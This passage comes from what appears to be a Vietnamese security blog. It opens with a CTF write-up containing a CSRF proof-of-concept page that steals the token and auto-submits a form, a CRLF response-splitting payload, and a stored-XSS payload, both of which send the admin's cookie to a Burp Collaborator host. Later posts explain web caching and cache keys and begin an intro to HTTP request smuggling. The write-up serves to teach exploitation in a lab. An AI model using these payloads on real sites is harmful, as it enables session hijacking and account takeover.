<blockquote class="wp-block-quote"><p>CSRF POC</p><cite>&lt;html&gt;<br> &lt;head&gt;<br>&lt;!-- CSRF PoC  --&gt;<br> &lt;/head&gt;<br> &lt;body onload="GetToken()"&gt;<br> <br> &lt;form id="form-payload" action="?action=profile" method="POST" enctype="multipart/form-data"&gt;<br>   &lt;input type="hidden" name="username" value="user"/&gt;<br>   &lt;input type="hidden" name="status" value="on"/&gt;<br>   &lt;input type="hidden" id="forged-token" name="token" value=""/&gt;<br>   &lt;input type="submit" value="go"/&gt;<br> &lt;/form&gt;<br> <br> &lt;script&gt;<br> var x = new XMLHttpRequest();<br> function GetToken() {<br>   x.open("GET","?action=profile",true);<br>   x.send(null); <br> }<br> x.onreadystatechange = function() {<br>   if (x.readyState == XMLHttpRequest.DONE) {<br>     var token = x.responseText.match(/name="token" value="(.+)"/)[1];<br>     document.getElementById("forged-token").value = token;<br>     document.getElementById("form-payload").submit();<br>   }<br> }<br> &lt;/script&gt;<br> &lt;/body&gt;<br> &lt;/html&gt;</cite></blockquote>
<!-- /wp:quote -->

<!-- wp:paragraph -->
<p>Submit cho admin và chờ một chút ta sẽ có kết quả.</p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2>HTTP Response Splitting</h2>
<!-- /wp:heading -->

<!-- wp:heading {"level":3} -->
<h3>Resolution</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>Để vượt qua challenge này ta cần một chút kiến thức về CRLF ( Carriage Return và Line Feed, CR và LF là các ký tự điều khiển, được mã hóa tương ứng 0x0D và 0x0A ). Hai kí tự này là một ký hiệu thể hiện sự kết thúc của response, và một response tiếp theo được bắt đầu, response ban đầu sẽ bị chia tách thành hai và nội dung của response thứ hai sẽ bị điều khiển bởi kẻ tấn công.Kẻ tấn công sau đó có thể tạo một request khác trong cùng một kết nối liên tục, và lừa người nhận (bao gồm cả các yếu tố trung gian) tin rằng response thứ hai này là để trả lời cho request thứ hai.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":36,"sizeSlug":"large"} -->
<figure class="wp-block-image size-large"><img src="http://hydrasky.ml/wp-content/uploads/2019/12/image-13.png" alt="" class="wp-image-36"/><figcaption>Dấu hiệu CRLF</figcaption></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Chú ý việc đâu tiền cần làm là thêm tiêu đề phản hồi HTTP giả mạo : Content-Length: 0. Điều này khiến trình duyệt web coi đây là phản hồi bị chấm dứt và bắt đầu phân tích một phản hồi mới sau đó là các header còn lại để tạo thành một request hợp lệ.</p>
<!-- /wp:paragraph -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><p>CLRF POC</p><cite>%0D%0AContent-%20Length%3A%200 # ngắt response<br> %0D%0A # blank<br> %0D%0AHTTP%2F1.1%20200%20OK # Tạo response mới<br> %0D%0AContent-Type%3A%20text%2Fhtml <br> %0D%0AX-XSS-Protection%3A%200<br> %0D%0ALast-Modified%3A%20Thu%2C%2001%20Jan%202099%2012%3A00%3A00%20GMT%20<br> %0D%0AContent-Length%3A%20192<br> %0D%0A<br> %0D%0%0D%0A%3cscript%3edocument.write%28%3cimg%20src%3dhttps%3a%2f%2fylnjvhj0bm0iuxb6163ydnafu60xom.burpcollaborator.net%3f%22.concat(document.cookie).concat(%22%20%2f%3e%22))%3c%2fscript%3e</cite></blockquote>
<!-- /wp:quote -->

<!-- wp:paragraph -->
<p>Submit và chờ kết quá trả về là session của admin.</p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2>XSS STORED 2</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>Challenge nay cong viec giong voi challenge XSS Store 1 , Nhung diem chu y o day la viec payload khong duoc truyen vao bang input value ma truyen qua http header, va cu the o day la cookie.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Thu bat request gui message cho admin ve check:</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":51,"sizeSlug":"large"} -->
<figure class="wp-block-image size-large"><img src="http://hydrasky.ml/wp-content/uploads/2019/12/image-16.png" alt="" class="wp-image-51"/><figcaption>Bat request bang burp<br></figcaption></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Ket qua tra ve la</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":52,"sizeSlug":"large"} -->
<figure class="wp-block-image size-large"><img src="http://hydrasky.ml/wp-content/uploads/2019/12/image-17.png" alt="" class="wp-image-52"/><figcaption>Gia tri cua status duoc lay tu cookie</figcaption></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Gia tri cua cookie "status= invite" da duoc dung de hien thi nguoi gui tin nhan.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p> Chen payload va doi admin doc tin nhan thoi!</p>
<!-- /wp:paragraph -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><p>Ket hop vs Burp collaborator client</p><cite>"&gt;document.write(%22&lt;img src=http://075lta73ds2oebant1t1ba7s9jf93y.burpcollaborator.net?%22.concat(document.cookie).concat(%22 /&gt;%22))<br></cite></blockquote>
<!-- /wp:quote -->

<!-- wp:paragraph -->
<p>Script da duoc thuc thi</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":53,"sizeSlug":"large"} -->
<figure class="wp-block-image size-large"><img src="http://hydrasky.ml/wp-content/uploads/2019/12/image-18-1024x171.png" alt="" class="wp-image-53"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Cookie nhan duoc dung de bypass challenge nay!!!! </p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":58,"sizeSlug":"large"} -->
<figure class="wp-block-image size-large"><img src="http://hydrasky.ml/wp-content/uploads/2019/12/image-19.png" alt="" class="wp-image-58"/></figure>
<!-- /wp:image -->
      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/06/14/WEB-CLIENT/" data-id="ckbgpmbcy000sqxjm0phz2ou3" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-Web Cache &amp; Cache Key" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/06/14/Web%20Cache%20&%20Cache%20Key/" class="article-date">
  <time datetime="2020-06-14T07:00:00.000Z" itemprop="datePublished">2020-06-14</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/06/14/Web%20Cache%20&%20Cache%20Key/">Web Cache &amp; Cache Key</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <!-- wp:heading -->
<h2>Web Cache</h2>
<!-- /wp:heading -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://techvccloud.mediacdn.vn/2018/6/18/web-cache-1529296599109108897388.png" alt="Web cache là gì? Tác dụng đối với website? - Ảnh 1."/></figure>
<!-- /wp:image -->

<!-- wp:heading {"level":4} -->
<h4>ĐỊnh nghĩa</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>Web cache (HTTP cache) là một dứng dụng công nghệ thông tin cho bộ nhớ tạm thời (caching ) để chứa các phản hồi từ hệ thống máy chủ, giúp giảm thiểu dữ liệu cần được truyền qua mạng.</p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://i.imgur.com/CnTvQBC.png" alt="Pentest Q&amp;A cùng Tsu] #7: Web-Cache Poisoning | Tsu BlogS ٩(^‿^)۶"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p> Web cache là một vùng nhớ  giữa client và server có nhiệm vụ là lưu trữ bản sao của những tài nguyên web sao cho gần với người dùng, cả về mặt chức năng trong web client hoặc những web caching servers riêng biệt. Tài nguyên đó có thể là :</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul><li>Ảnh</li><li>CSS</li><li>Các file HTML tĩnh</li><li>Các file Javascript</li></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p><strong>Tại sao lại cần Caching? </strong></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://betterexplained.com/wp-content/uploads/compression/HTTP_request.png" alt="Yêu cầu HTTP"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Thử nghĩ khi bạn truy cập vào 1 website bán hàng, trình duyệt sẽ phải load về rất nhiều nội dung như file ảnh, js, html .... Nếu không dùng có cache thì mỗi lần truy cập vào website đó tất cả nội dung sẽ lại phải load lại lần nữa. Như vậy mỗi lần click hay chuyển tag mà băng thông yếu cái chắc "tui nhìn mà tui  tức quá " chưa kể có nếu như có nhiều người truy cập đến website nữa. </p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://images.viblo.asia/72dcd966-26ed-46a7-8565-0ba1cb7c59bb.png" alt=""/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Lúc này bạn chỉ muốn load thật nhanh còn sysadmin muốn giảm gánh nặng cho máy chủ nên người ta đã dùng cách lưu lại các response các request thường gặp cả ở trên phía máy chủ (Server-side caching) và phía người dùng (Browser caching). Máy chủ sẽ không phải xử lý từng request riêng biệt nữa mà thay vào đó bộ cache sẽ giúp nó gửi trả ngay một response. Một giải pháp khác là bạn mua thêm nhiều máy chủ khác nhưng tất nhiên là bạn sẽ phải có rất nhiều tiền (Và ở đây chúng tôi không làm thees)</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":4} -->
<h4>Nội dung cache được lưu trữ ở đâu? </h4>
<!-- /wp:heading -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://image.slidesharecdn.com/cacheinapigateway-150418032736-conversion-gate01/95/cache-in-api-gateway-18-638.jpg?cb=1429499697" alt=""/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><strong>Server-side caching</strong> </p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Người ta thường gọi là Surrogate Cache bởi vì nó hoạt động như Gateway cache . Một  Surrogate Cache là một server lưu các files tĩnh để phục vụ cho việc gửi trả lại các response cho các request phổ biến. Nó sẽ tiếp nhận các request thông thường và nhanh chóng gửi response. Caching proxy sẽ giúp máy chủ chính của bạn không phải xử lý các request này, do đó giảm gánh nặng cho phía server.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>Browser caching</strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Trình duyệt sẽ phân vùng một lượng nhất định trên ổ cứng của máy tính. Dung lượng này dành để lưu trữ những nội dung bạn đã xem. Hình thức này cho phép truy xuất thông tin khá nhanh do dữ liệu web được lấy trực tiếp từ máy tính người dùng thay vì phải tải lại qua đường truyền mạng và cũng góp phần giảm lưu lượng phía server. Ví dụ trình duyệt lưu một bản sao của một tệp (như hình ảnh logo) và sử dụng bản sao được lưu trong bộ nhớ cache (đã lưu) này trên mỗi trang bạn vào mà cần logo đó.&nbsp;Điều này tránh phải tải xuống hình ảnh một lần nữa và hoàn hảo  phải không?</p>
<!-- /wp:paragraph -->

<!-- wp:image {"width":593,"height":333} -->
<figure class="wp-block-image is-resized"><img src="https://techtalk.vn/wp-content/uploads/2017/11/NO.jpg" alt="Kết quả hình ảnh cho no" width="593" height="333"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Đó lại là vấn đề ! Điều gì xảy ra khi logo công ty thay đổi?&nbsp;SOCOLA =&gt; CORONA</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Bạn sẽ vẫn lướt truy cập vào website đó như thường nhưng bạn sẽ không biết logo của website đã được thay đổi bởi vì cái logo đang xuất hiện trong trình duyệt của bạn là từ browser cache mà ra. Bạn thử nghĩ thay vì 1 cái logo là file js hoặc html điều gì sẽ xảy ra ? . Kệ  m* thôi bởi vì đã có cách khăc phục mà hehe:</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Gateway Cache sẽ lưu các files khác nhau ở những thời điểm khác nhau, nó sẽ quyết định xem files nào nên cache và các files đã được cache có tiếp tục được sử dụng không. Máy chủ báo cho trình duyệt&nbsp;<strong>version</strong>&nbsp;của tệp mà nó đang gửi.&nbsp;Máy chủ sẽ trả về một&nbsp;<code>Last-modified</code> - header response cùng với tệp (giả sử là logo.png), như thế này:</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><code>Last-modified: Fri, 16 Mar 2007 04:00:25 GMT</code>&nbsp;<code>File Contents (could be an image, HTML, CSS, Javascript...)</code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Bây giờ trình duyệt biết rằng tệp mà nó nhận được (logo.png) đã được tạo vào ngày 16 tháng 3 năm 2007 và nó sẽ tiếp tục dùng logo từ Browser cache. Lần tiếp theo nếu  trình duyệt cần logo.png, nó sẽ tiếp tục thực hiện kiểm tra đặc biệt với máy chủ:</p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://betterexplained.com/wp-content/uploads/compression/HTTP-caching-last-modified_1.png" alt="HTTP caching last modified"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Ngoài ra còn một số header response là "Etag" có nhiệm vụ xác thực  nội dung chính xác được lưu trong cache và "Expires , Cache-Control " để giới hạn thời gian, tránh trình duyệt không giao tiếp với máy chủ giả sử trong trường hợp file không thay đổi một thời gian dài. <a href="https://betterexplained.com/articles/how-to-optimize-your-site-with-http-caching/" target="_blank" rel="noreferrer noopener" aria-label=" (opens in a new tab)">Chi tiết </a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>Proxy Cache</strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Ngoài hai nơi lưu trữ cache chính ra , trong một môi trường doanh nghiệp rộng lớn nguời ta còn sử dụng các thiết bị đòng vai trò Web proxy cache làm việc cùng nguyên tắc với browser cache, nhưng ở phương diện rộng lớn hơn. Proxy server đáp ứng hàng trăm hoặc hàng ngàn users cùng một cách thức, những tập đoàn lớn và IPS thường thiết lập chúng trên các firewalls, hoặc như một thiết bị độc lập (thường hiểu như là những phương tiện trung gian). Bởi vì proxy cache không phải là một phần của client hay server chính nên chúng ta không cần phải hiểu rõ. </p>
<!-- /wp:paragraph -->

<!-- wp:image {"width":590,"height":334} -->
<figure class="wp-block-image is-resized"><img src="https://cache.digistar.vn/wp-content/uploads/2016/12/cache-2.png" alt="Kết quả hình ảnh cho Proxy Cache" width="590" height="334"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Tiện ở đây có một khái niệm minh muốn giới thiệu là Mạng cung cấp nội dung - Content Delivery Network (CDN), là tập các máy chủ trung gian ( hay còn được gọi là   transparent proxy cache ) được đặt khắp nơi trên thế giới.Hoạt động như một "Gateway" vì vậy mọi request đến mấy chủ trung tâm đều tự động phải đi qua nó , mục đích là giảm thiểu yêu cầu lên máy chủ. Hoạt động như mô hình của Proxy cache . Bạn tưởng tượng xem như Facebook hay Amazon sẽ phải đặt bao nhiêu CDN trên thế giới. Ngoài ra còn các các dịch vụ cho thuê CDN như của cloudFlare, Akamai ... .</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Tòm lại việc sử dụng cache rất có lợi cho website của bạn. Không những tối ưu băng thông, tốc độ cho cả người dùng lẫn server , cải thiện việc phân phối nội dung mà còn tăng khả năng bảo mật như chống DOS- DDOS.</p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2>Cache Key</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>Làm thế nào để web cache nhận diện ra được 2 request là tương tự, là giống nhau và quyết định gửi luôn response cho request  tương tự hay là chuyển lên server lấy new source về.   </p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Lập trình viên có thể cài đặt theo cơ chế so sánh byte to byte cho cache. Nhưng cách này kém hiệu quả vì quá trính xảy ra sẽ rất tốn thời gian và tài nguyên ngoài ra trong thành phần của request có nhiều header không ảnh hưởng đến response như " User-Agent" chẳng hạn.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Có một cách khác đó chính là sử dụng Cache Key - là sử dụng một số thành phần cụ thể của HTTP request dùng để dùng để xác định resource đang được yêu cầu và các request tương đương . </p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":162,"width":596,"height":168,"sizeSlug":"large"} -->
<figure class="wp-block-image size-large is-resized"><img src="http://hydrasky.ml/wp-content/uploads/2020/03/image-7.png" alt="" class="wp-image-162" width="596" height="168"/><figcaption> Ví dụ Cache key ( Màu cam) </figcaption></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Ngoài ra còn người ta còn sử dụng một header response là "Vary" - dùng để chỉ định những header (ngoại trừ đường dẫn-URL và Host ) nào thêm vào request cần bị khóa lại - để nhận response dúngý sẽ bắt buộc phải có các header được xác thực qua "vary". Mặc dù header này rất hữu hiệu nhưng nếu sử dụng không chính xác có thể dẫn đến tình trạng tụt tỉ lệ hiệu suất, dữ kiệu chuyển đi bị sai lệch rất là cao nên header này được thiết lập qua loa hay thậm chí không được sử dụng.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"width":283,"height":148} -->
<figure class="wp-block-image is-resized"><img src="https://2.bp.blogspot.com/-E_npOkaDOHc/Ur8HBKisJxI/AAAAAAAAAO8/WhdtGvuDwsc/w1200-h630-p-k-no-nu/vary-header-not-working.png" alt="gZip Compression removes pre-existing vary header | Sitecore Tactics" width="283" height="148"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><a href="https://www.keycdn.com/support/vary-header" target="_blank" rel="noreferrer noopener" aria-label="Chi tiết tham khảo (opens in a new tab)">Chi tiết tham khảo</a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Xong như vậy mình đã giới thiệu xong về web cache và cache key! Có gì thắc mặc các bạn có thể để lại comment bên dưới . Thank !</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>[UPDATE-10/4/2020]</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3>Làm sao để biết được reponse được trả về từ cache ?</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>Một câu hỏi rất hay ! Mình cũng đã đi tìm và câu trả lời của mình lúc này cũng chưa chính thức nha. Theo như mình tìm hiểu sẽ có 2 cách để xác định được response đó từ cache hay trực tiếp từ server .</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Cách đầu tiên đó là dựa vào "status code" HTTP và ở đây là mã "304 Not Modified" - không có sữa đổi. Điều này có nghĩa là tài nguyên được lấy lúc này không có gì thay đVổi và nó sẽ lấy từ cache về thay vì chuyển hướng đến server.</p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://developers.google.com/web/fundamentals/performance/optimizing-content-efficiency/images/http-cache-control.png" alt="HTTP Caching | Web Fundamentals | Google Developers"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Cách hai đó chính là dựa vào response header trong response được trả về đó là X-Cache và X-Cache-Lookup header. Thực chất 2 header này không phải là hai chuẩn được quy định trong RFC (Prefix "X"- không phải là chuẩn HTTP Header Field. Nó hay được dùng bởi các CDN và vì vậy các tên gọi của nó cũng có thể được thay đổi theo ý họ.</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul><li>"X-Cache" tương ứng với việc proxy có lấy response từ cache hay không (HIT  là có và MISS là không)</li><li>"X-Cache-Lookup"  sẽ nói là proxy có lưu response cho request tương ứng hay không (HIT là có và MISS là không) #Thông thừơng header này ít gặp nên mình cũng không rõ lắm.</li></ul>
<!-- /wp:list -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://1.bp.blogspot.com/--nwPp96Bsqc/W67uqZ76QPI/AAAAAAAAAHA/oSva9i5E4FsEeFfFa3Fsvjbn1GoeJ4segCLcBGAs/s1600/Screenshot_1.png" alt="Clement Nedelcu's Development Journal: How to fix: Nginx proxy or ..."/><figcaption>Ví dụ</figcaption></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Ngoài ra còn có các header khác như Age,Etag, exprires, Las-modified, cache-control cũng cho biết các thông tin về việc dữ liệu được lưu trữ trong cache.</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":4} -->
<h4>Link Tham khảo</h4>
<!-- /wp:heading -->

<!-- wp:list -->
<ul><li><a href="https://betterexplained.com/articles/how-to-optimize-your-site-with-http-caching/" target="_blank" rel="noopener">https://betterexplained.com/articles/how-to-optimize-your-site-with-http-caching/</a></li><li><a href="https://vi.wikipedia.org/wiki/Web_caching" target="_blank" rel="noopener">https://vi.wikipedia.org/wiki/Web_caching</a></li><li><a href="https://www.freecodecamp.org/news/web-caching-explained-by-buying-milk-at-the-supermarket-2ba6133ca4ed/" target="_blank" rel="noopener">https://www.freecodecamp.org/news/web-caching-explained-by-buying-milk-at-the-supermarket-2ba6133ca4ed/</a></li><li><a href="https://viblo.asia/p/nhung-dieu-can-biet-ve-web-cache-Qbq5QJLLKD8" target="_blank" rel="noopener">https://viblo.asia/p/nhung-dieu-can-biet-ve-web-cache-Qbq5QJLLKD8</a></li><li><a href="https://docs.microsoft.com/en-us/azure/cdn/cdn-caching-rules" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/azure/cdn/cdn-caching-rules</a></li><li>#Response </li><li><a href="https://publicobject.com/2015/03/26/how-do-http-caching-heuristics-work/" target="_blank" rel="noopener">https://publicobject.com/2015/03/26/how-do-http-caching-heuristics-work/</a></li><li><a href="https://stackoverflow.com/questions/3027492/x-cache-header-explanation/29772017" target="_blank" rel="noopener">https://stackoverflow.com/questions/3027492/x-cache-header-explanation/29772017</a></li><li><a href="https://developers.google.com/web/fundamentals/performance/optimizing-content-efficiency/http-caching" target="_blank" rel="noopener">https://developers.google.com/web/fundamentals/performance/optimizing-content-efficiency/http-caching</a></li></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p></p>
<!-- /wp:paragraph -->
      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/06/14/Web%20Cache%20&%20Cache%20Key/" data-id="ckbgpmbcz000tqxjmh6w4dlrf" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Technology/" rel="tag">Technology</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-SCSP" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/06/14/SCSP/" class="article-date">
  <time datetime="2020-06-14T07:00:00.000Z" itemprop="datePublished">2020-06-14</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/06/14/SCSP/">Bug Bouting</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <!-- wp:paragraph -->
<p>Source: Seasoned Cyber Security Professionals</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":222,"sizeSlug":"large"} -->
<figure class="wp-block-image size-large"><img src="http://hydrasky.ml/wp-content/uploads/2020/04/EQA36MwUUAIKJgq.jpeg" alt="" class="wp-image-222"/></figure>
<!-- /wp:image -->

<!-- wp:image {"id":223,"sizeSlug":"large"} -->
<figure class="wp-block-image size-large"><img src="http://hydrasky.ml/wp-content/uploads/2020/04/EQpQxqxXUAA1XNQ.jpeg" alt="" class="wp-image-223"/></figure>
<!-- /wp:image -->

<!-- wp:image {"id":224,"sizeSlug":"large"} -->
<figure class="wp-block-image size-large"><img src="http://hydrasky.ml/wp-content/uploads/2020/04/ERENeHdU4AYTrhA.jpeg" alt="" class="wp-image-224"/></figure>
<!-- /wp:image -->

<!-- wp:image {"id":225,"sizeSlug":"large"} -->
<figure class="wp-block-image size-large"><img src="http://hydrasky.ml/wp-content/uploads/2020/04/ESGicEGXsAIAuyZ.jpeg" alt="" class="wp-image-225"/></figure>
<!-- /wp:image -->

<!-- wp:image {"id":226,"sizeSlug":"large"} -->
<figure class="wp-block-image size-large"><img src="http://hydrasky.ml/wp-content/uploads/2020/04/ETYh8eUXkAA1nmZ.jpeg" alt="" class="wp-image-226"/></figure>
<!-- /wp:image -->

<!-- wp:image {"id":227,"sizeSlug":"large"} -->
<figure class="wp-block-image size-large"><img src="http://hydrasky.ml/wp-content/uploads/2020/04/ETYh8gLWsAIqY2h.jpeg" alt="" class="wp-image-227"/></figure>
<!-- /wp:image -->

<!-- wp:image {"id":228,"sizeSlug":"large"} -->
<figure class="wp-block-image size-large"><img src="http://hydrasky.ml/wp-content/uploads/2020/04/EUYMBCTXkAA9PPS.jpeg" alt="" class="wp-image-228"/></figure>
<!-- /wp:image -->

<!-- wp:image {"id":229,"sizeSlug":"large"} -->
<figure class="wp-block-image size-large"><img src="http://hydrasky.ml/wp-content/uploads/2020/04/EUYMBCXXgAIfW4T.jpeg" alt="" class="wp-image-229"/></figure>
<!-- /wp:image -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://scontent.fhan2-4.fna.fbcdn.net/v/t1.0-9/90263180_197491121672407_104104672905658368_n.jpg?_nc_cat=106&amp;_nc_sid=8024bb&amp;_nc_oc=AQlY638JCBzJJyPGgQksAKkdGcZBz8RfxqfhdyXzV6FnwmhTGSbrTBzW4B_jNphLChc&amp;_nc_ht=scontent.fhan2-4.fna&amp;oh=cf6efba272513e2c1de0127e3fc1906c&amp;oe=5EB2BB17" alt="Không có mô tả ảnh."/></figure>
<!-- /wp:image -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://scontent.fhan2-4.fna.fbcdn.net/v/t1.0-9/90920440_202762121145307_5055889622286991360_n.jpg?_nc_cat=106&amp;_nc_sid=8024bb&amp;_nc_oc=AQlyVEJqE9fZNSZMxluWIDoWhJM3IcGXHyU9plr1ZzDC9PyHRq2bWyMHnLfSFHXC_po&amp;_nc_ht=scontent.fhan2-4.fna&amp;oh=61af73213d7fedfa7423c07a9198539c&amp;oe=5EB0DD73" alt="Không có mô tả ảnh."/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Source <a href="https://www.youtube.com/user/RapidBug" target="_blank" rel="noreferrer noopener">InsiderPhD</a> channel on Youtube</p>
<!-- /wp:paragraph -->

<!-- wp:core-embed/youtube {"url":"https://www.youtube.com/watch?v=oTeQSG5LjjE","type":"video","providerNameSlug":"youtube","className":"wp-embed-aspect-16-9 wp-has-aspect-ratio"} -->
<figure class="wp-block-embed-youtube wp-block-embed is-type-video is-provider-youtube wp-embed-aspect-16-9 wp-has-aspect-ratio"><div class="wp-block-embed__wrapper">
https://www.youtube.com/watch?v=oTeQSG5LjjE
</div></figure>
[![InsiderPhD]()](https://www.youtube.com/watch?v=oTeQSG5LjjE)

<!-- /wp:core-embed/youtube -->
      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/06/14/SCSP/" data-id="ckbgpmbbs0000qxjm7jxwf9mt" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/BugBoutyTip/" rel="tag">BugBoutyTip</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-HTTP Request Smuggling Attack" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/06/14/HTTP%20Request%20Smuggling%20Attack/" class="article-date">
  <time datetime="2020-06-14T07:00:00.000Z" itemprop="datePublished">2020-06-14</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/06/14/HTTP%20Request%20Smuggling%20Attack/">HTTP Request Smuglling</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <!-- wp:paragraph -->
<p> Một trong các lỗ hổng  dựa vào tính năng của giao thức HTTP từ đó tạo các các thông điệp HTTP message đặc biệt ,phía server sẽ phân tích và diễn giải các message nhận được theo ý của attacker. HTTP Request Smuggling gọi tắt là HRS là một kĩ thuật , phương tiện tấn công năng cao, được công bố trong một <a rel="noreferrer noopener" href="https://www.cgisecurity.com/lib/HTTP-Request-Smuggling.pdf" target="_blank">tài liêu</a> vào năm 2005 bởi một công ty công nghệ Wathfire . HRS là kĩ thuật can thiệp vào việc xử lý tuần tự các  HTTP request tới một web site từ một hoặc nhiều user.</p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://portswigger.net/web-security/images/http-request-smuggling.svg" alt="What is HTTP request smuggling? Tutorial &amp; Examples | Web Security ..."/><figcaption>src: PortSwigger</figcaption></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Lỗ hổng này thường được đánh giá ở mức Critical do HRS có khả năng bypass các kiểm soát truy cập, tường lửa web. Ngoài ra HRS còn là phương tiện để thực hiện các cuộc tấn công nguy hiểm khác như Web Cache Poisoning , Cross Site Scripting, Session Hijacking, Server-Side Requesr Forgery,Open Redirect,... Danh sách này còn có thể còn nhiều hơn nữa bởi còn nhiều kiểu tấn công chưa được khám phá.</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":4} -->
<h4> HTTP Request Smuggling sinh ra từ đâu?</h4>
<!-- /wp:heading -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://documentation.help/DogeTool-HTTP-Requests-vt/http_requestmessageexample.png" alt="HTTP Request Message - HTTP Requests Documentation"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
